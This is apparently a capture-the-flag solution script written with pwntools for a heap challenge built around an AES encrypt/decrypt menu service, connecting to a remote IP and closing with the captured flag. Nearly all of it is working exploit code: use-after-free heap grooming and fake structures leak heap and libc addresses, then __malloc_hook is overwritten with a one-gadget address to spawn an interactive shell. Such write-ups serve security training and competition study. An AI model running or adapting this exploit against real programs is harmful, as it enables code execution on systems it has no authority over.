from pwn import *
#coding: utf8
import sys
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
DEBUG = 0
if DEBUG:
     p = process('./task')
     e = ELF('./task')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     #libc = ELF('./libc64.so')
     
     
else:
     p = remote('111.186.63.201', 10001)
     libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
     #libc = ELF('libc_64.so.6')

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

class prpcrypt():
    def __init__(self, key,iv):
        self.key = key
        self.mode = AES.MODE_CBC
        self.iv = iv
     
    
    def encrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.iv)
        length = 32
        count = len(text)
	if(count % length != 0) :
        	add = length - (count % length)
	else:
		add = 0
        text = text + ('\0' * add)
        self.ciphertext = cryptor.encrypt(text)
        return b2a_hex(self.ciphertext)
     
    
    def decrypt(self, text):
        cryptor = AES.new(self.key, self.mode, self.iv)
        plain_text = cryptor.decrypt(a2b_hex(text))
        return plain_text.rstrip('\0')
 

def add(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data=''):
    p.recvuntil('3. Go')
    p.sendline('1')
    p.recvuntil('id : ')
    p.sendline(str(idx))
    p.recvuntil('(2): ')
    p.sendline(str(way))
    p.recvuntil('Key : ')
    p.send(key)
    p.recvuntil('IV : ')
    p.send(IV)
    p.recvuntil('Size : ')
    p.sendline(str(size))
    p.recvuntil('Data : ')
    p.send(data)

def add2(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data=''):
    p.recvuntil('3. Go')
    p.sendline('1')
    p.recvuntil('id : ')
    p.sendline(str(idx))
    p.recvuntil('(2): ')
    p.sendline(str(way))
    p.recvuntil('Key : ')
    p.send(key)
    p.recvuntil('IV : ')
    p.send(IV)
    p.recvuntil('Size : ')
    p.sendline(str(size))
    p.recvuntil('Data : ')
    p.send(data)

def add1(idx=1,way=1,key='1'*0x20,IV='a'*0x10,size=0,data=''):
    #p.recvuntil('3. Go')
    p.sendline('1')
    p.recvuntil('id : ')
    p.sendline(str(idx))
    p.recvuntil('(2): ')
    p.sendline(str(way))
    p.recvuntil('Key : ')
    p.send(key)
    p.recvuntil('IV : ')
    p.send(IV)
    p.recvuntil('Size : ')
    p.sendline(str(size))
    p.recvuntil('Data : ')
    p.send(data)

def delete(idx):
    p.recvuntil('3. Go')
    p.sendline('2')
    p.recvuntil('id : ')
    p.sendline(str(idx))
def delete1(idx):
    #p.recvuntil('3. Go')
    p.sendline('2')
    p.recvuntil('id : ')
    p.sendline(str(idx))
def go(idx):
    p.recvuntil('3. Go')
    p.sendline('3')
    p.recvuntil('id : ')
    p.sendline(str(idx))

def pwn():
    #debug(0x921)
    
    
    add(9999,1,size=0x10,data='B'*0x10)
    add(1,1,size=0x10,data='1'*0x10)
    add(2,1,size=0x10,data='1'*0x10)
    add(3,1,size=0x70,data='1'*0x70)
    
    add(4,1,size=0x10,data='1'*0x10)
    add(5,1,size=0x10,data='1'*0x10)
    delete(4)
    delete(2)
    go(1)
    
    delete1(1)
    delete(3)
    add(6,1,size=0x10,data='1'*0x10)
    add(7,1,size=0x20,data='1'*0x20)

    p.recvuntil('text: \n')
    
    data=p.recvuntil('\n')
    data=data.replace(" ",'').strip()
    #data1=p.recvuntil('\n')
    #data1=data1.replace(" ",'').strip()
    #data=data+data1
    print data
    
    pc = prpcrypt('1'*0x20,'a'*0x10)      
    #e = pc.encrypt("1"*0x20)
    d = pc.decrypt(data)                     
    print d
    addr=u64(d[:8])
    print hex(addr)
    offset=0x260
    heap_base=addr-0x1a00-offset
    print "heap base",hex(heap_base)
    #p.interactive()
    add1(0,1,size=0x10,data='1'*0x10)
    add(0,1,size=0x10,data='1'*0x10)
    add(0,1,size=0x10,data='1'*0x10)

    

    #add(0,1,size=0x10,data='1'*0x10)
    #debug(0x1253)
    add(99,1,size=0x10,data='1'*0x10)
    add(98,2,size=0x10,data='1'*0x10)
    
    struct_enc=heap_base+0x2270+offset
    struct_dec=heap_base+0x24d0+offset
    libc_heap=heap_base+0x4e00+offset
    for i in range(0,7):
        add(100+i,1,size=0x300,data='1'*0x300)
    add(97,1,size=0x300,data='1'*0x300)
    add(11,1,size=0x10,data='1'*0x10)
    add(12,1,size=0x70,data='1'*0x70)
    add(13,1,size=0x10,data='1'*0x10)
    for i in range(0,7):
        delete(100+i)
    delete(97)
    
    for i in range(0,4):
        add(50+i,1,size=0x10,data='1'*0x10)
    #debug(0x1597)
    go(11)
    
    delete1(11)
    delete(12)
    fake_struct=p64(libc_heap)+p64(0x10)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(struct_enc)+p64(0xb)+p64(0)
    add(12,1,size=0x10,data='1'*0x10)
    add(96,1,size=0x70,data=fake_struct)
    
    p.recvuntil('text: \n')
    
    data=p.recvuntil('\n')
    data=data.replace(" ",'').strip()

    d = pc.decrypt(data)                     
    print d
    addr=u64(d[:8])
    print hex(addr)
    libc_base=addr-0x3ebca0
    print "libc_base",hex(libc_base)
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    
    add1(8,1,size=0x10,data='a'*0x10)
    for i in range(0,10):
        add(8,1,size=0x10,data='a'*0x10)
    
    aa='a'*0x1000
    print len(pc.encrypt(aa).decode('hex'))
    data=pc.encrypt((p64(malloc_hook-0x14)+p64(0x10))*8)
    
    data=data.decode('hex')
    print len(data),data
    add(1,2,size=0x10,data='a'*0x10)
    add(2,2,size=0x70,data='a'*0x70)
    #debug(0x15c6)
    #debug(0x12f5)
    add(3,2,size=0x1000,data=data*(0x1000/len(data)))
    #p.interactive()
    delete(9999)
    go(1)
    print p.recvuntil('Prepare...')
    delete1(1)
    #delete(98)
    delete(2)
    add(4,2,size=0x10,data='a'*0x10)
    addr=heap_base+0x7230
    fake_struct=p64(addr-0x800)+p64(0x1300)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(struct_dec)+p64(0xb)+p64(0)
    #fake_struct=p64(addr)+p64(0x10)+p32(1)+'1'*0x20+'a'*0x10+p32(0)+p64(0)+p64(0)+p64(struct_dec)+p64(0xb)+p64(0)
    
    
    add(5,2,size=0x70,data=fake_struct)
    rce=libc_base+0x10a38c
    
    
    sleep(5)
    
    #debug(0x12f5)
    add2(6,1,size=0x10,data=p64(rce)*2)
    #sleep(3)
    #debug(0x12f5)
    #raw_input('456')
    #debug(0x13be)

    p.sendline('1')
    p.recvuntil('id : ')
    p.sendline(str(1))
    p.recvuntil('(2): ')
    p.sendline(str(1))
    p.recvuntil('Key : ')
    p.send(p64(rce)*4)
    '''
    add2(6,1,size=0x10,data=p64(rce)*2)
    
    p.recvuntil('3. Go')
    p.sendline('1')
    p.recvuntil('id : ')
    p.sendline(str(1))
    p.recvuntil('(2): ')
    p.sendline(str(1))
    #debug(0x12f5)
    '''
    p.interactive()
    

if __name__ == '__main__':
   pwn()
#flag{pl4y_w1th_u4F_ev3ryDay_63a9d2a26f275685665dc02b886b530e}
